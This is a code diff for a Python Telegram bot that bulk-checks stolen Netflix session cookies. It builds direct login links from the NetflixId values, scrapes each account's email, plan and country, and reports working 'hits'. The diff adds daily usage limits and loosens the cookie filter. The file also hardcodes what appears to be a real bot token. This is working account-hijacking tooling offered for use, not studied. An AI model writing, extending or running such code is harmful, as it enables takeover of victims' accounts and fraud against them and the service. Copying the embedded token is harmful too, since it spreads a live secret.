@@ -26,6 +26,7 @@ log.setLevel(logging.ERROR)
 
 user_modes = {}
 bulk_access = {} # {user_id: expiry_timestamp}
+user_daily_usage = {} # {user_id: {'date': 'YYYY-MM-DD', 'count': 0}}
 BOT_TOKEN = "8477278414:AAHAxLMV9lgqvSCjnj_AIDnH6pxm82Q55So"
 ADMIN_ID = 6176299339
 CHANNELS = ["@F88UFNETFLIX", "@F88UF9844"]
@@ -93,6 +94,26 @@ def calculate_duration(member_since_str):
         diff = datetime.now() - since_date
         return f"({diff.days // 365}y {(diff.days % 365) // 30}m)"
     except: return ""
+
+def get_daily_usage(uid):
+    today = datetime.now().strftime('%Y-%m-%d')
+    if uid not in user_daily_usage:
+        user_daily_usage[uid] = {'date': today, 'count': 0}
+    data = user_daily_usage[uid]
+    if data['date'] != today:
+        data['date'] = today
+        data['count'] = 0
+    return data['count']
+
+def increment_daily_usage(uid, count=1):
+    today = datetime.now().strftime('%Y-%m-%d')
+    if uid not in user_daily_usage:
+        user_daily_usage[uid] = {'date': today, 'count': 0}
+    data = user_daily_usage[uid]
+    if data['date'] != today:
+        data['date'] = today
+        data['count'] = 0
+    data['count'] += count
 
 def extract_deep_details(html):
     details = {
@@ -255,6 +276,10 @@ def check_cookie(cookie_input):
     # 1. Get Magic Link from API
     api_res = call_api("gen", {"netflix_id": nid})
     
+    # Local Fallback Link (Fix for API failure)
+    local_link = f"https://www.netflix.com/login?NetflixId={nid}"
+    final_link = api_res.get("login_url") if api_res and api_res.get("login_url") else local_link
+    
     # 2. Check Account Details via Requests
     with requests.Session() as session:
         session.headers.update(HEADERS)
@@ -324,7 +349,7 @@ def check_cookie(cookie_input):
             return {
                 "valid": True, 
                 "country": deep_data["country"], 
-                "link": api_res.get("login_url") if api_res else "Token Not Found", 
+                "link": final_link, 
                 "data": deep_data, 
                 "screenshot": screenshot_bytes
             }
@@ -334,7 +359,7 @@ def check_cookie(cookie_input):
                  return {
                     "valid": True,
                     "country": "Unknown",
-                    "link": api_res.get("login_url"),
+                    "link": final_link,
                     "data": {"email": api_res.get("email", "N/A"), "plan": "Unknown", "status": "Active"},
                     "screenshot": None
                  }
@@ -599,24 +624,38 @@ def main():
             for c in cookies:
                 c = c.strip()
                 # Check for Netflix indicators or JSON/Netscape format
-                if len(c) > 20 and ("NetflixId" in c or "netflix" in c.lower() or "=" in c):
-                    valid_cookies.append(c)
-                elif c.startswith("{") or c.startswith("["):
+                # Relaxed filter to accept raw cookie values
+                if len(c) > 10:
                     valid_cookies.append(c)
             
             if not valid_cookies: return bot.reply_to(message, "❌ **No Valid Cookies Found!**", parse_mode='Markdown')
 
             should_send_file = is_file_input or len(valid_cookies) > 1
             is_bulk = should_send_file
+            
+            cookies_to_process = valid_cookies
+            limit_msg = None
+            has_access = False
 
-            # Bulk Access Check
+            # Bulk Access & Daily Limit Logic
             if is_bulk and uid != ADMIN_ID:
                 expiry = bulk_access.get(uid, 0)
-                if time.time() > expiry:
-                    markup = types.InlineKeyboardMarkup()
-                    markup.add(types.InlineKeyboardButton("🔓 Request Bulk Access", callback_data=f"req_bulk_{uid}"))
-                    bot.reply_to(message, "⚠️ **Bulk Check Not Enabled!**\n\nBulk checking is restricted to prevent server load.\n\n👇 **Click below to request access (Valid for 1 Hour).**", reply_markup=markup, parse_mode='Markdown')
-                    return
+                has_access = time.time() < expiry
+                
+                if not has_access:
+                    used = get_daily_usage(uid)
+                    limit = 5
+                    remaining = limit - used
+                    
+                    if remaining <= 0:
+                        markup = types.InlineKeyboardMarkup()
+                        markup.add(types.InlineKeyboardButton("🔓 Request Bulk Access", callback_data=f"req_bulk_{uid}"))
+                        bot.reply_to(message, "⚠️ **Daily Bulk Limit Exceeded!**\n\nYou have used your 5 free bulk checks for today.\n👇 **Click below to request unlimited access (1 Hour).**", reply_markup=markup, parse_mode='Markdown')
+                        return
+                    
+                    if len(valid_cookies) > remaining:
+                        cookies_to_process = valid_cookies[:remaining]
+                        limit_msg = f"⚠️ **Daily Limit Reached!**\nChecked {len(cookies_to_process)} cookies. The rest were skipped.\n👇 **Request access to check more.**"
 
             # Single Cookie Animation Logic
             if not is_bulk:
@@ -647,7 +686,7 @@ def main():
                 else: bot.reply_to(message, f"❌ **Invalid Cookie**\nReason: {res.get('msg', 'Unknown')}")
                 return
 
-            def background_checker(cookies, chat_id, target, send_file):
+            def background_checker(cookies, chat_id, target, send_file, limit_warning, is_privileged):
                 bot.send_message(chat_id, f"🚀 **Bulk Check Started!**\nChecking {len(cookies)} Cookies...", parse_mode='Markdown')
                 valid_count = 0
                 hits_list = [] # Store hits for summary file
@@ -674,6 +713,9 @@ def main():
                             valid_count += 1
                             hits_list.append(result)
                 
+                if not is_privileged and uid != ADMIN_ID:
+                    increment_daily_usage(uid, len(cookies))
+                
                 # Generate and Send Summary File
                 if hits_list and send_file:
                     try:
@@ -696,10 +738,14 @@ def main():
 
                 try:
                     bot.send_message(chat_id, f"✅ **Check Complete.** Hits: {valid_count}", parse_mode="Markdown")
+                    if limit_warning:
+                        markup = types.InlineKeyboardMarkup()
+                        markup.add(types.InlineKeyboardButton("🔓 Request Bulk Access", callback_data=f"req_bulk_{chat_id}"))
+                        bot.send_message(chat_id, limit_warning, reply_markup=markup, parse_mode='Markdown')
                 except: pass
 
             # Start background thread to prevent blocking other users
-            threading.Thread(target=background_checker, args=(valid_cookies, uid, mode['target'], should_send_file), daemon=True).start()
+            threading.Thread(target=background_checker, args=(cookies_to_process, uid, mode['target'], should_send_file, limit_msg, has_access), daemon=True).start()
 
         except Exception as e:
             bot.reply_to(message, f"❌ Error: {e}")
